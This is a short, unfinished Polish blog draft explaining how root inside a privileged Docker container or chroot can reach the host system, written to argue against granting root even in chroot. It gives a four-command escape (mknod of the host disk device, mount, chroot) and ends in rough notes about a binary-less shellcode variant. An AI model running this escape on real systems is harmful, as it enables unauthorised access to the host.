Hacking the chroot/docker
#########################

:keywords: linux, chroot, hacking, docker
:tags: linux, chroot, hacking, docker
:date: 2019-01-19
:Status: draft
:slug: chroot-breaking-1


W tym poście pokażę jak mając *root* w *chroot* dostać się do systemu nadzorcy.  
Tym samym chcę pokazaż, dlaczego nie należy przyznawać praw administratora użytkownikowi nawet w *chroot*.

Crash course
------------

Ponieważ *docker* (podobnie jak większość technologi kontenerowych) używa *chroot*-a, wyjście z *chroot* czy *docker* sprowadza się do tej samej metody.
Poniższa metoda wymaga posiadania konta *root* w kontenerze uruchomionego z uprawnieniami *privileged* (a często takie właśnie kontenery są tworzone)

.. code-block:: console

    # docker run -it --privileged centos /bin/bash
    # mknod /tmp/host_disk b 259 1
    # mount /tmp/host_disk /mnt/
    # chroot /mnt/ /bin/bash

Analiza metody
--------------

Metoda wymaga użytkownika *root* w *chroot*

 
Idea: breaking chroot
- mknod, mount, chroot
- przetestować na dockerze
- zrobić w chroot bez binarek poprzez echo -e "<shellcode>"


